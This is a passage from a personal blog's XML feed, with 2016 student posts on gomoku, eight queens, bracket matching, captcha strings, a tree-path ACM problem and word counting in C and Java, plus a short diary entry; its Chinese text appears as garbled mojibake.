sum=0;        if(isOut(i,n)==0)            continue;        for(col=n;sum&lt;=5;col++)            if(a[i][col]!=flag)                break;            else                sum++;        if(sum==5)        {            printf(&quot;%cp%d success\n&quot;,flag,flag);            exit(1);        }    }}void test(int i,int j,int flag)//ÂØπÊ£ãÂ≠êÊó∂ÂÄô5ËøûÊµãËØï{    if(a[i-1][j-1]==flag||a[i+1][j+1]==flag)//ËøôÊòØÂØπÂè≥ÂØπËßíÁ∫øÁöÑÂà§Êñ≠        testRight(i,j,flag);    if(a[i-1][j]==flag||a[i+1][j]==flag)//ËøôÊòØÂØπ‰∏ä‰∏ãÁöÑÂà§Êñ≠        testUpToDown(i,j,flag);    if(a[i-1][j+1]==flag||a[i+1][j-1]==flag)//ËøôÊòØÂØπÂ∑¶ÂØπËßíÁ∫øÁöÑÂà§Êñ≠        testLeft(i,j,flag);    if(a[i][j-1]==flag||a[i][j+1]==flag)//ËøôÊòØÂØπÂ∑¶Âè≥Âà§Êñ≠        testLeftToRight(i,j,flag);}int main()//Êú¨Âú∫ÊØîËµõ‰∏≠Ôºåp1Áé©ÂÆ∂Áî®printf(&quot;%c &quot;,1);p2Áé©ÂÆ∂Áî®printf(&quot;%c &quot;,2);{    //ÂàùÂßãÂåñÊ£ãÁõò    int total=0,flag;//total‰Ωú‰∏∫ËÆ°ÁÆóÊòØÂê¶Âπ≥Â±Ä‰ª•ÂèäÊâìÂç∞Êó∂ÈÄöËøá%2ÔºåÂ≠òÂÖ•aÊï∞ÁªÑ‰∏≠1Âíå2ÔºåÂíåÊâìÂç∞Âú®ÊòæÁ§∫Âô®‰∏ä‰∏çÂêåÊ£ãÂ≠ê    int i,j;    memset(a,0,sizeof(a)/sizeof(int));//stringÁ±ªÊñπÊ≥ïÂ°´ÂÖÖaÊï∞ÁªÑ    system(&quot;color 2f&quot;);//ÊéßÂà∂Âè∞È¢úËâ≤    print();//ÊâìÂç∞Ê£ãÁõò    while(1)//ÂºÄÂßã‰∏ãÊ£ã    {        if(total==100)        {            printf(&quot;Game Draw\n&quot;);//Âπ≥Â±Ä            break;        }        printf(&quot;%cp%d please\n&quot;,total%2+1,total%2+1);        flag=total%2+1;        scanf(&quot;%d%d&quot;,&amp;i,&amp;j);        while(i&lt;0||i&gt;9||j&lt;0||j&gt;9||a[i][j]!=0)        {            printf(&quot;ËæìÂÖ•‰ΩçÁΩÆ‰∏çÂêàÊ≥ï,ËØ∑ÈáçÊñ∞ËæìÂÖ•\n&quot;);            scanf(&quot;%d%d&quot;,&amp;i,&amp;j);        }        a[i][j]=flag;        system(&quot;cls&quot;);        printf(&quot;%cp%d pre put at [%d] [%d]\n&quot;,flag,flag,i,j);//ÊâìÂç∞‰πãÂâç‰∏Ä‰∏™‰∫∫‰∏ãÁöÑ‰ΩçÁΩÆ        print();        test(i,j,flag);        total++;    }    return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ÁÆóÊ≥ï </tag>
            
            <tag> ‰∫îÂ≠êÊ£ã </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂÖ´ÁöáÂêé</title>
      <link href="/2016/09/11/%E5%85%AB%E7%9A%87%E5%90%8E/"/>
      <url>/2016/09/11/%E5%85%AB%E7%9A%87%E5%90%8E/</url>
      
        <content type="html"><![CDATA[<p>Áªà‰∫éÂÜôÂÆå‰∫ÜÔºåÂê¨ËØ¥Êúâ92ÁßçÊéíÂ∫èÊñπÂºèÔºåÁúã‰∫Ü‰∏çÂ∞ëÂçöÂÆ¢ÔºåÁúãÂà∞ËøôÂè•ËØùÔºåÁúãÂà´‰∫∫‰ª£Á†ÅÁôæÈÅçÔºå‰∏çÂ¶ÇËá™Â∑±ÂÜô‰∏ÄÈÅçÔºåÁÑ∂ÂêéÁúãÂà´‰∫∫‰ª£Á†ÅÔºåÂ§™ÁÆÄÊ¥ÅÔºåÊ≤°ÁúãÊáÇÔºåËøòÊòØËá™Â∑±ÂÜô</p><p>ÂÜô‰∫ÜÂ•Ω‰πÖÔºåÁªà‰∫éÊàêÂäü‰∫ÜÔºåËÆ∞ÂæóÂä†Ê≤πÔºå‰∏ãÈù¢Ëøô‰∏™ÂõæÂæàÈ≠îÊÄßÔºåÂÜôÂç°‰∫ÜÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•ÁúãÁúãÂõæÔºåÁªßÁª≠ÂÜô</p><p><img src="https://img-my.csdn.net/uploads/201205/06/1336311585_2632.gif" alt="">  </p><pre><code>#include &lt;stdio.h&gt;int queen[9];void print()//ÊâìÂç∞{    int i,j;    for(i=1;i&lt;=8;i++)    {        for(j=1;j&lt;=8;j++)            if(queen[i]==j)                 printf(&quot;%c &quot;,2);//ÊâìÂç∞Ëøô‰∏™Âú∞ÊñπÔºåÊàëÊòØÊ®°‰ªøÂà´‰∫∫ÁöÑÊâìÂç∞ÊñπÂºèÔºåÊâìÂç∞Âá∫Êù•ÔºåËøòÊòØËõÆ‰∏çÈîôÁöÑÔºåËõÆ‰∫∫ÊÄßÂåñÁöÑ            else                 printf(&quot;. &quot;);        printf(&quot;\n&quot;);    }    }int check(int i)//Âà§Êñ≠Êó∂ÂÄôÂêàÊ≥ï{    int j;    for(j=1;j&lt;i;j++)        if(queen[j]==queen[i]||queen[j]-queen[i]==j-i||queen[j]-queen[i]==i-j)            return 0;    return 1;}int next(int i)//Ëé∑Âæó‰∏ã‰∏ÄË°åÂêàÊ≥ï‰ΩçÁΩÆ{    int j;    for(j=1;j&lt;=8;j++)    {        queen[i]=j;        if(check(i)==1)        {            return j;        }            }    return 0;        }int replace(int i)//Âú®ÂΩìÂâçË°åÂØªÊâæÈô§Âéªqueen[i]Ôºå‰πüÂ∞±ÊòØqueen[i]+1~8‰πãÈó¥ÁöÑÂèØÈÄâ‰ΩçÁΩÆ{    int j;    if(queen[i]==8)        return 0;    for(j=queen[i]+1;j&lt;=8;j++)    {        queen[i]=j;        if(check(i)==1)            return i;    }    return 0;}void Try(int i,int value){    queen[i]=value;    if(i==8)    {        print();        return;    }/*    int m,n;    for(m=1;m&lt;=8;m++)    {        for(n=1;n&lt;=8;n++)            if(queen[m]==n)                printf(&quot;* &quot;);            else                printf(&quot;0 &quot;);        printf(&quot;\n&quot;);    }*/        if(next(i+1)==0)//‰∏ã‰∏ÄË°åÊ≤°ÊúâÂêàÊ≥ï‰ΩçÁΩÆ        {            while(replace(i)==0)//ÂΩìÂâçË°å‰πüÊó†ÂêàÊ≥ï‰ΩçÁΩÆÔºåÂàôÁªßÁª≠Âæ™ÁéØ‰∏ä‰∏Ä‰∏™ÂêàÁêÜ‰ΩçÁΩÆ//ÊÑüËßâËøô‰∏™Âú∞ÊñπÔºåÊòØÊúÄÂêéÊâçÊÉ≥Â•ΩÁöÑÔºåÊÑüËßâÂæàÈáçË¶Å            {                i--;                replace(i);            }            Try(i,queen[i]);        }        else//‰∏ã‰∏ÄË°åÂ≠òÂú®ÂêàÊ≥ï‰ΩçÁΩÆ            Try(i+1,next(i+1));}int main(){    int i;    for(i=1;i&lt;=8;i++)        queen[i]=0;    Try(1,1);    return 0;}</code></pre><p>ËøôÂè™ÊòØÁ¨¨‰∏ÄÁßçÔºå‰ª•ÂêéÂÜçÊõ¥Êñ∞92Áßç</p><p>-‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî-</p><p>Êù•‰∏™Êö¥ÂäõÁöÑÔºåËôΩÁÑ∂‰∏çÂ•ΩÔºå‰ΩÜÊòØ‰ªñËøôÁßçÂæàËΩª‰æø</p><p>void put(int n)<br>{<br>int i;<br>for(i=1;i&lt;MAX;i++)<br>{<br>s[n]=i;<br>if(check(n))<br>{<br>if(n==MAX-1)<br>result();<br>else<br>put(n+1);<br>}<br>}<br>}  </p>]]></content>
      
      
      
        <tags>
            
            <tag> ÁÆóÊ≥ï </tag>
            
            <tag> ÂõûÊ∫Ø </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nyoj4614Êã¨Âè∑ÂåπÈÖç</title>
      <link href="/2016/09/07/nyoj4614%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D/"/>
      <url>/2016/09/07/nyoj4614%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<pre><code>import java.util.Scanner;import java.util.Stack;public class Main {    public static void main(String[] args) {        Scanner input=new Scanner(System.in);        int testNum=input.nextInt();        out:while(testNum--!=0){            String str=input.next();            Stack&lt;Character&gt; stack=new Stack&lt;Character&gt;();            if(str.length()%2!=0||str.charAt(0)==&apos;]&apos;||str.charAt(0)==&apos;)&apos;){                System.out.println(&quot;No&quot;);                continue out;            }            for(int i=0;i&lt;str.length();i++){                if(str.charAt(i)==&apos;(&apos;||str.charAt(i)==&apos;[&apos;)                    stack.push(str.charAt(i));                else                    if((stack.isEmpty())||!match(stack.pop(),str.charAt(i))){                        System.out.println(&quot;No&quot;);                        continue out;                    }           }            System.out.println(&quot;Yes&quot;);                  }        input.close();    }    public static boolean match(Character ch1,char ch2){        return (ch1==&apos;(&apos;&amp;&amp;ch2==&apos;)&apos;)||(ch1==&apos;[&apos;&amp;&amp;ch2==&apos;]&apos;);    }}</code></pre><p>Ëøô‰∏™ÊòØÊ®°‰ªøÂà´‰∫∫ÁöÑ‰ª£Á†ÅÔºå<br>‰∏ãÈù¢Êñ∞Â≠¶‰ºöÁöÑ</p><pre><code>import java.util.Stack;out:continue out;//ÂÜôÁöÑoutÔºåÁõ¥Êé•Ë∑≥Âá∫Âà∞outÂ§ÑStack&lt;Character&gt; stack=new Stack&lt;Character&gt;();input.close();public static boolean match(Character ch1,char ch2){        return (ch1==&apos;(&apos;&amp;&amp;ch2==&apos;)&apos;)||(ch1==&apos;[&apos;&amp;&amp;ch2==&apos;]&apos;);    }</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>È™åËØÅÁ†ÅÁîüÊàê</title>
      <link href="/2016/09/06/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%94%9F%E6%88%90/"/>
      <url>/2016/09/06/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<pre><code>import java.util.Scanner;public class Main {    public static void main(String[] args) {        String randomCode=&quot;&quot;;        System.out.println(&quot;ËØ∑ËæìÂÖ•‰Ω†ÁîüÊàêÂá†‰ΩçÈ™åËØÅÁ†Å&quot;);        Scanner input=new Scanner(System.in);        int n=input.nextInt();        for(int i=0;i&lt;n;i++){            int random=(int)(Math.random()*3+1);                if(random==1)                    randomCode=randomCode+getRandomLowerCaseLetter();                else if(random==2)                    randomCode=randomCode+getRandomUpperCaseLetter();                else                    randomCode=randomCode+getRandomDigitCharacter();                }        System.out.println(randomCode);         }    public static char getRandomCharacter(char ch1,char ch2){        return (char)(ch1+Math.random()*(ch2-ch1+1));    }    public static char getRandomLowerCaseLetter(){        return getRandomCharacter(&apos;a&apos;,&apos;z&apos;);    }    public static char getRandomUpperCaseLetter(){        return getRandomCharacter(&apos;A&apos;,&apos;Z&apos;);    }    public static char getRandomDigitCharacter(){        return getRandomCharacter(&apos;0&apos;,&apos;9&apos;);    }}</code></pre><p>‰πãÂâçÂú®ËßÜÈ¢ë‰∏äÁúãËøáÔºåÂΩìÊó∂Á¨¨‰∏ÄÊ¨°ÁúãËßÅÔºåÊÑüËßâÂæàÂ•áÂ¶ôÔºåÁé∞Âú®Ëá™Â∑±ÂÜôËµ∑Êù•Ôºå‰πüËøòËõÆÊúâÊàêÂ∞±ÊÑüÁöÑÔºåËøô‰∏™‰ª£Á†ÅÔºåÂäüËÉΩÂ∞±ÊòØÔºå‰Ω†ËæìÂÖ•‰∏Ä‰∏™‰Ω†ÊÉ≥ÁîüÊàêÂá†‰ΩçÁöÑÈ™åËØÅÁ†ÅÁöÑ‰∏™Êï∞ÔºåÁÑ∂ÂêéÔºåËæìÂá∫Âá†‰ΩçÈ™åËØÅÁ†Å</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nyoj4632ÂêùÂï¨ÁöÑÂõΩÂ∫¶</title>
      <link href="/2016/09/06/nyoj4632%E5%90%9D%E5%95%AC%E7%9A%84%E5%9B%BD%E5%BA%A6/"/>
      <url>/2016/09/06/nyoj4632%E5%90%9D%E5%95%AC%E7%9A%84%E5%9B%BD%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>È¢òÁõÆÊèèËø∞  </p><p>Âú®‰∏Ä‰∏™ÂêùÂï¨ÁöÑÂõΩÂ∫¶ÈáåÊúâN‰∏™ÂüéÂ∏ÇÔºåËøôN‰∏™ÂüéÂ∏ÇÈó¥Âè™ÊúâN-1Êù°Ë∑ØÊääËøô‰∏™N‰∏™ÂüéÂ∏ÇËøûÊé•Ëµ∑Êù•„ÄÇÁé∞Âú®ÔºåTomÂú®Á¨¨SÂè∑ÂüéÂ∏ÇÔºå‰ªñÊúâÂº†ËØ•ÂõΩÂú∞ÂõæÔºå‰ªñÊÉ≥Áü•ÈÅìÂ¶ÇÊûúËá™Â∑±Ë¶ÅÂéªÂèÇËßÇÁ¨¨TÂè∑ÂüéÂ∏ÇÔºåÂøÖÈ°ªÁªèËøáÁöÑÂâç‰∏Ä‰∏™ÂüéÂ∏ÇÊòØÂá†Âè∑ÂüéÂ∏ÇÔºàÂÅáËÆæ‰Ω†‰∏çËµ∞ÈáçÂ§çÁöÑË∑ØÔºâ„ÄÇ</p></blockquote><p>ËæìÂÖ•<br>Á¨¨‰∏ÄË°åËæìÂÖ•‰∏Ä‰∏™Êï¥Êï∞MË°®Á§∫ÊµãËØïÊï∞ÊçÆÂÖ±ÊúâM(1&lt;=M&lt;=5)ÁªÑ<br>ÊØèÁªÑÊµãËØïÊï∞ÊçÆÁöÑÁ¨¨‰∏ÄË°åËæìÂÖ•‰∏Ä‰∏™Ê≠£Êï¥Êï∞N(1&lt;=N&lt;=100000)Âíå‰∏Ä‰∏™Ê≠£Êï¥Êï∞S(1&lt;=S&lt;=100000)ÔºåNË°®Á§∫ÂüéÂ∏ÇÁöÑÊÄª‰∏™Êï∞ÔºåSË°®Á§∫ÂèÇËßÇËÄÖÊâÄÂú®ÂüéÂ∏ÇÁöÑÁºñÂè∑<br>ÈöèÂêéÁöÑN-1Ë°åÔºåÊØèË°åÊúâ‰∏§‰∏™Ê≠£Êï¥Êï∞a,b(1&lt;=a,b&lt;=N)ÔºåË°®Á§∫Á¨¨aÂè∑ÂüéÂ∏ÇÂíåÁ¨¨bÂè∑ÂüéÂ∏Ç‰πãÈó¥Êúâ‰∏ÄÊù°Ë∑ØËøûÈÄö„ÄÇ</p><p>ËæìÂá∫<br>ÊØèÁªÑÊµãËØïÊï∞ÊçÆËæìN‰∏™Ê≠£Êï¥Êï∞ÔºåÂÖ∂‰∏≠ÔºåÁ¨¨i‰∏™Êï∞Ë°®Á§∫‰ªéSËµ∞Âà∞iÂè∑ÂüéÂ∏ÇÔºåÂøÖÈ°ªË¶ÅÁªèËøáÁöÑ‰∏ä‰∏Ä‰∏™ÂüéÂ∏ÇÁöÑÁºñÂè∑„ÄÇÔºàÂÖ∂‰∏≠i=SÊó∂ÔºåËØ∑ËæìÂá∫-1ÔºâÔºàÊØèÁªÑ‰∏ÄË°åÔºåË°åÊú´ÊúâÁ©∫Ê†ºÔºâ</p><p>Ê†∑‰æãËæìÂÖ•<br>1<br>10 1<br>1 9<br>1 8<br>8 10<br>10 3<br>8 6<br>1 2<br>10 4<br>9 5<br>3 7</p><p>Ê†∑‰æãËæìÂá∫<br>-1 1 10 10 9 8 3 1 1 8<br>‰∏ãÈù¢ÊòØËá™Â∑±ÂÜôÁöÑÔºå‰ΩÜÊòØ‰∏çÊòØÊ≠£ÁâàÁöÑÔºåÂè™ÊòØÂá≠Ëá™Â∑±ÊÑüËßâÂÜôÁöÑdpsÔºåÊôö‰∏äÂú®Á≥ªÁªüÁöÑËÆ§ÁúüÂ≠¶‰π†‰∏Ä‰∏ãdps<br>ÊîπËøõÂâçÁöÑ‰ª£Á†ÅÔºàÊ≤°ËøáÔºåÊÄªÊòØË∂ÖÊó∂Ôºâ</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int city[10000][10000];void dps(int toCity,int num,int myCity){    int i,j;    for(i=1;i&lt;=num;i++)    if(city[myCity][toCity]==1)    {        printf(&quot;%d &quot;,myCity);        break;    }    else if(city[myCity][i]==1)    {        city[myCity][i]=2;        city[i][myCity]=2;        dps(toCity,num,i);    }}int main(){    int m;    int num,myCity;    int i,j,n;    scanf(&quot;%d&quot;,&amp;m);    while(m--)    {        scanf(&quot;%d%d&quot;,&amp;num,&amp;myCity);        memset(city,0,num+1);        int row,col;        for(i=1;i&lt;num;i++)        {            scanf(&quot;%d%d&quot;,&amp;row,&amp;col);            city[row][col]=1;            city[col][row]=1;        }        for(i=1;i&lt;=num;i++)        {           if(i==myCity)           {                printf(&quot;-1 &quot;);                continue;           }            else            {                for(n=1;n&lt;=num;n++)                for(j=n;j&lt;=num;j++)                if(city[n][j]==2)                {                    city[n][j]=1;                    city[j][n]=1;                }                dps(i,num,myCity);            }        }    }    return 0;}</code></pre><p>ÊÑüËßâËá™Â∑±ÁãóÂ∏¶‰∫ÜÔºåËøòÊòØÊ≤°ÊÄé‰πàËøáÔºåÂÜôÁöÑÔºåËøá‰∏ç‰∫Ü</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÁªüËÆ°ÂçïËØç</title>
      <link href="/2016/09/04/%E7%BB%9F%E8%AE%A1%E5%8D%95%E8%AF%8D/"/>
      <url>/2016/09/04/%E7%BB%9F%E8%AE%A1%E5%8D%95%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<p><strong>ÊñπÊ≥ï‰∏ÄÔºöScanner‰∏≠ÊñπÊ≥ïhasNext()</strong></p><pre><code>/* * È¢òÁõÆÂÜÖÂÆπÔºö‰Ω†ÁöÑÁ®ãÂ∫èË¶ÅËØªÂÖ•‰∏ÄÁØáËã±ÊñáÊñáÁ´†ÔºåÁÑ∂ÂêéÁªüËÆ°ÂÖ∂‰∏≠ÁöÑÂçïËØçÊï∞Êù•ËæìÂá∫„ÄÇÈúÄË¶ÅÁªüËÆ°ÁöÑÊï∞ÊçÆ‰∏∫ÔºöÊÄªÁöÑÂçïËØçÊï∞ÈáèÔºõÂê´Êúâ1‰∏™Â≠óÊØçÂà∞10‰∏™Â≠óÊØçÁöÑÂçïËØçÁöÑÊï∞Èáè„ÄÇÂçïËØçÂíåÂçïËØçÁöÑÈó¥ÈöîÊòØÁî±ÂêÑÁßçÁ©∫Ê†ºÔºàÂåÖÊã¨Á©∫Ê†º„ÄÅtabÂíåÂõûËΩ¶Êç¢Ë°åÔºâÂΩ¢ÊàêÁöÑÔºå‰πüÂ∞±ÊòØËØ¥ÔºåËøôÈáåÁöÑÂçïËØç‰∏éËØ≠Ë®ÄÊó†ÂÖ≥ÔºåÂèØ‰ª•ÂåÖÊã¨ÂêÑÁßçÁ¨¶Âè∑ÔºåÊØîÂ¶Ç‚Äúit&apos;s‚ÄùÁÆó‰∏Ä‰∏™ÂçïËØçÔºåÈïøÂ∫¶‰∏∫4„ÄÇÊ≥®ÊÑèÔºåË°å‰∏≠ÂèØËÉΩÂá∫Áé∞ËøûÁª≠ÁöÑÁ©∫Ê†º„ÄÇÈïøÂ∫¶Ë∂ÖËøá10‰∏™Â≠óÊØçÁöÑÂçïËØçÈúÄË¶ÅËÆ°ÂÖ•ÊÄªÁöÑÂçïËØçÊï∞ÈáèÔºå‰ΩÜÊòØ‰∏çÂÅöÂàÜÁ±ªÁªüËÆ°„ÄÇÂõ†Ê≠§ÔºåÂØπ‰∫é‰∏ãÈù¢ÁöÑÂè•Â≠êÔºö&quot;What you see is a very hefty response,&quot; said CNN Aviation Correspondent Rene Marsh.ÂÖ∂‰∏≠ÁöÑÂçïËØçÂÖ±14‰∏™„ÄÇÊ≥®ÊÑèËøôÈáåÁöÑresponse,&quot;ÂêéÈù¢Ë∑ü‰∫ÜÁ©∫Ê†º„ÄÇËæìÂÖ•Ê†ºÂºè:‰∏ÄÁØáËã±ÊñáÊñáÁ´†„ÄÇËæìÂá∫Ê†ºÂºèÔºö11‰∏™Êï∞Â≠óÔºå‰æùÊ¨°ÊòØÊÄªÁöÑÂçïËØçÊï∞Èáè„ÄÅ1‰∏™Â≠óÊØçÁöÑÂçïËØçÊï∞Èáè„ÄÅ2‰∏™Â≠óÊØçÁöÑÂçïËØçÊï∞Èáè„ÄÇ„ÄÇ„ÄÇ10‰∏™Â≠óÊØçÁöÑÂçïËØçÁöÑÊï∞Èáè„ÄÇÊØè‰∏™Êï∞Â≠óÂêéÊúâ‰∏Ä‰∏™Á©∫Ê†º„ÄÇË°åÊú´Êúâ‰∏Ä‰∏™ÂõûËΩ¶Êç¢Ë°å„ÄÇËæìÂÖ•Ê†∑‰æãÔºö&quot;What you see is a very hefty response,&quot; said CNN Aviation Correspondent Rene Marsh.ËæìÂá∫Ê†∑‰æãÔºö14 1 1 3 3 2 1 0 1 0 1 Êó∂Èó¥ÈôêÂà∂Ôºö500msÂÜÖÂ≠òÈôêÂà∂Ôºö32000kb*/import java.util.Scanner;public class StatisticalWord {//ÁªüËÆ°ÂçïËØç‰∏™Êï∞    public static void main(String[] args) {        Scanner input=new Scanner(System.in);           int count=0;        int[] counter=new int[11];        while(input.hasNext()){            String str=input.next();            if(str.length()&lt;=10&amp;&amp;str.length()&gt;=0){                counter[str.length()]++;            }               count++;        }        System.out.print(count);        for(int i=1;i&lt;=10;i++)            System.out.print(&quot; &quot;+counter[i]);        System.out.println();        input.close();    }}</code></pre><p>Êú¨È¢òÊòØÈõ∂Âü∫Á°ÄÂ≠¶JavaËØ≠Ë®ÄÊúüÊú´ËÄÉËØïÁöÑÁºñÁ®ãÈ¢ò<br>Ê≥®ÊÑè‰ª•‰∏ãÂá†ÁÇπ</p><ol><li>it‚Äôs‚ÄùÁÆó‰∏Ä‰∏™ÂçïËØçÔºåÈïøÂ∫¶‰∏∫4 </li><li>ÊØè‰∏™Êï∞Â≠óÂêéÊúâ‰∏Ä‰∏™Á©∫Ê†º„ÄÇË°åÊú´Êúâ‰∏Ä‰∏™ÂõûËΩ¶Êç¢Ë°å„ÄÇ </li><li>ËøôÈáåÁöÑresponse,‚ÄùÂêéÈù¢Ë∑ü‰∫ÜÁ©∫Ê†º </li><li>ÊúÄÂêéÊµãËØïÊó∂ÔºåÂ∫îËØ•ÂÖàÂ∞ÜË¶ÅÊµãËØïÁöÑÂè•Â≠êÔºåctrl+zÁ≤òË¥¥Âà∞ÊéßÂà∂Âè∞‰∏äÔºåÁÑ∂ÂêéenterÔºåÁÑ∂Âêéctrl+zÔºàÊ≠§Â§ÑÊòØ‰∏∫‰∫ÜEOFÔºâ </li></ol><hr><p><strong>ÊñπÊ≥ï‰∫åÔºöString‰∏≠ÊñπÊ≥ïsplit()</strong></p><blockquote><p>split ÊñπÊ≥ïÔºöÂ∞Ü‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂàÜÂâ≤‰∏∫Â≠êÂ≠óÁ¨¶‰∏≤ÔºåÁÑ∂ÂêéÂ∞ÜÁªìÊûú‰Ωú‰∏∫Â≠óÁ¨¶‰∏≤Êï∞ÁªÑËøîÂõû„ÄÇ<br> stringObj.split([separator]Ôºå[limit])<br> ÂèÇÊï∞ÔºöstringObj ÂøÖÈÄâÈ°π„ÄÇË¶ÅË¢´ÂàÜËß£ÁöÑ String ÂØπË±°ÊàñÊñáÂ≠ó„ÄÇËØ•ÂØπË±°‰∏ç‰ºöË¢´ split ÊñπÊ≥ï‰øÆÊîπ„ÄÇ<br> separator ÂèØÈÄâÈ°π„ÄÇÂ≠óÁ¨¶‰∏≤Êàñ Ê≠£ÂàôË°®ËææÂºè ÂØπË±°ÔºåÂÆÉÊ†áËØÜ‰∫ÜÂàÜÈöîÂ≠óÁ¨¶‰∏≤Êó∂‰ΩøÁî®ÁöÑÊòØ‰∏Ä‰∏™ËøòÊòØÂ§ö‰∏™Â≠óÁ¨¶„ÄÇÂ¶ÇÊûúÂøΩ<br> Áï•ËØ•ÈÄâÈ°πÔºåËøîÂõûÂåÖÂê´Êï¥‰∏™Â≠óÁ¨¶‰∏≤ÁöÑÂçï‰∏ÄÂÖÉÁ¥†Êï∞ÁªÑ„ÄÇ limitÂèØÈÄâÈ°π„ÄÇËØ•ÂÄºÁî®Êù•ÈôêÂà∂ËøîÂõûÊï∞ÁªÑ‰∏≠ÁöÑÂÖÉÁ¥†‰∏™Êï∞„ÄÇ<br> ËØ¥ÊòéÔºösplit ÊñπÊ≥ïÁöÑÁªìÊûúÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Êï∞ÁªÑÔºåÂú® stingObj ‰∏≠ÊØè‰∏™Âá∫Áé∞ separator ÁöÑ‰ΩçÁΩÆÈÉΩË¶ÅËøõË°åÂàÜËß£„ÄÇseparator<br>‰∏ç‰Ωú‰∏∫‰ªª‰ΩïÊï∞ÁªÑÂÖÉÁ¥†ÁöÑÈÉ®ÂàÜËøîÂõû„ÄÇ<br> split ÁöÑÂÆûÁé∞Áõ¥Êé•Ë∞ÉÁî®ÁöÑ matcher Á±ªÁöÑ split ÁöÑÊñπÊ≥ï„ÄÇ‚Äú . ‚ÄùÂú®Ê≠£ÂàôË°®ËææÂºè‰∏≠ÊúâÁâπÊÆäÁöÑÂê´‰πâÔºåÂõ†Ê≠§Êàë‰ª¨‰ΩøÁî®ÁöÑÊó∂ÂÄôÂøÖÈ°ªËøõË°åËΩ¨‰πâ‚Äù\.‚Äù<br> Â¶ÇÊûúÁî®Á´ñÁ∫ø‚Äú|‚ÄùÂàÜÈöîÁöÑËØùÔºåÂ∞ÜÂá∫Áé∞‰∏çÂèØÂæóÂà∞ÁöÑÁªìÊûúÔºåÂøÖÈ°ªÊîπ‰∏∫‚Äú|‚Äù<br> Ôºå+ * ‰∏çÊòØÊúâÊïàÁöÑÊ®°ÂºèÂåπÈÖçËßÑÂàôË°®ËææÂºèÔºåÁî®‚Äù//*‚Äù ‚Äú//+‚ÄùËΩ¨‰πâÂêéÂç≥ÂèØÂæóÂà∞Ê≠£Á°ÆÁöÑÁªìÊûú„ÄÇ</p></blockquote><pre><code>import java.util.*;public class Main {    public static void main(String a[]) {         Scanner input=new Scanner(System.in);        String Sentence=input.nextLine();        count(Sentence);    }public static void count(String str){        int count=0;        String string=str;        int a[]=new int[11];        String s[]=string.split(&quot; &quot;);        for(int i=0;i&lt;s.length;i++)            if(s[i].length()&lt;=10&amp;&amp;s[i].length()&gt;=0)                a[s[i].length()]++;                 System.out.print(s.length);        for(int i=1;i&lt;=10;i++)            System.out.print(&quot; &quot;+a[i]);        System.out.println();       }}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂºÄÂ≠¶ËÆ∞</title>
      <link href="/2016/09/02/%E5%BC%80%E5%AD%A6%E8%AE%B0/"/>
      <url>/2016/09/02/%E5%BC%80%E5%AD%A6%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>2016.09.02<br>ÂºÄÂ≠¶Âá†Â§©‰∫ÜÔºåËØæÁ®ãÁ¥¢ÁÑ∂Êó†Âë≥Ôºå‰∏ÄÁõ¥Ê≤°Á¢∞‰ª£Á†ÅÔºå‰∏ªË¶ÅÊòØÊú¨ËÉΩÁöÑÂÆ≥ÊÄïÔºõ<br>ÊöëÂÅáÔºåÂ≠¶ËΩ¶ÔºåÊ≤°ËøáÔºõ<br>4Á∫ßÁ´üÁÑ∂Ëøá‰∫ÜÔºå‰πü‰∏çÈîô‰∫ÜÔºõ<br>Â§ßÈÉ®ÂàÜÊó∂Èó¥ÔºåËä±Âú®‰∫ÜÊ∏∏ÊàèÂíåÂ®±‰πê‰∏äÔºõ<br>ÊàëÂú®ÊÉ≥ÂïäÔºå‰∫∫‰∏çËÉΩÂ§™‰∏ìÊ≥®Â≠¶‰π†ÔºåË¶ÅÊáÇÁÇπÁîüÊ¥ªÁöÑÊÉÖË∂£Ôºõ<br>Áé∞Âú®Âú®ÁúãËØõ‰ªôÔºåÁúãÂÆåÂÜçÂ≠¶‰π†ÔºåÊó†Ê≥ïÂ≠¶‰π†ÔºåÊ≤âËø∑Â∞èËØ¥Ôºõ<br>ÁæéÂ¶àÔºöËøô‰∏™‰∏ñÁïåÂÄºÂæóÊàë‰ª¨‰∏∫‰πãÂ•ãÊñóÔºÅ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ÁîüÊ¥ª </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nyoj 915 +-Â≠óÁ¨¶‰∏≤</title>
      <link href="/2016/07/29/nyoj%20915%20+-%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2016/07/29/nyoj%20915%20+-%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
